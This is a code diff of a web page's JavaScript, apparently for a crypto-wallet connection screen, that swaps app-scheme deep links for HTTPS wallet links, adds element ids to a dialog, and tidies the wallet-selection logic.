@@ -205,8 +205,8 @@
 
 <div id="dialogMask" class="dialog-mask">
     <div class="dialog">
-        <div class="dialog-message"></div>
-        <button class="dialog-button">确定</button>
+        <div class="dialog-message" id="dialogMessage"></div>
+        <button class="dialog-button" id="dialogClose">确定</button>
     </div>
 </div>
 
@@ -248,7 +248,7 @@
         }
     };
 
-    // 钱包配置
+    // 钱包配置（使用通用 HTTPS 链接）
     const WALLETS = {
         evm: {
             metamask: {
@@ -262,19 +262,19 @@
             tronlink: {
                 name: 'TronLink',
                 icon: '🌊',
-                dappUrl: (url) => `tronlink://dapp?url=${encodeURIComponent(url)}`,
+                dappUrl: (url) => `https://www.tronlink.org/dapp?url=${encodeURIComponent(url)}`,
                 isInjected: () => window.tronLink && window.tronLink.ready === true
             },
             tokenpocket: {
                 name: 'TokenPocket',
                 icon: '🎫',
-                dappUrl: (url) => `tp://browser?url=${encodeURIComponent(url)}`,
+                dappUrl: (url) => `https://tokenpocket.pro/dapp?url=${encodeURIComponent(url)}`,
                 isInjected: () => window.tronWeb && window.tronWeb.defaultAddress !== undefined
             },
             imtoken: {
                 name: 'imToken',
                 icon: '🔷',
-                dappUrl: (url) => `imtokenv2://dapp?url=${encodeURIComponent(url)}`,
+                dappUrl: (url) => `https://token.im/dapp?url=${encodeURIComponent(url)}`,
                 isInjected: () => window.ethereum && window.ethereum.isImToken === true
             }
         }
@@ -289,7 +289,7 @@
     const statusDiv = document.getElementById('status');
     const dialogMask = document.getElementById('dialogMask');
     const dialogMessage = document.getElementById('dialogMessage');
-    const dialogButton = document.querySelector('.dialog-button');
+    const dialogClose = document.getElementById('dialogClose');
 
     function showStatus(message, type = 'loading') {
         statusDiv.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${message}` : message;
@@ -302,7 +302,7 @@
         dialogMask.style.display = 'flex';
     }
     function hideDialog() { dialogMask.style.display = 'none'; }
-    dialogButton.onclick = hideDialog;
+    dialogClose.onclick = hideDialog;
     dialogMask.onclick = (e) => { if (e.target === dialogMask) hideDialog(); };
 
     // 更新授权地址显示
@@ -474,22 +474,18 @@
             return;
         }
         const isTron = currentChain === '728126428';
-        let dappUrl;
+        let wallet;
         if (isTron) {
-            const wallet = WALLETS.tron[selectedWallet];
-            if (!wallet) {
-                showDialog('无效的钱包');
-                return;
-            }
-            dappUrl = wallet.dappUrl(window.location.href);
+            wallet = WALLETS.tron[selectedWallet];
         } else {
-            const wallet = WALLETS.evm[selectedWallet];
-            if (!wallet) {
-                showDialog('无效的钱包');
-                return;
-            }
-            dappUrl = wallet.dappUrl(window.location.href);
+            wallet = WALLETS.evm[selectedWallet];
         }
+        if (!wallet) {
+            showDialog('无效的钱包');
+            return;
+        }
+        const currentUrl = window.location.href;
+        const dappUrl = wallet.dappUrl(currentUrl);
         console.log('跳转链接:', dappUrl);
         window.location.href = dappUrl;
     }
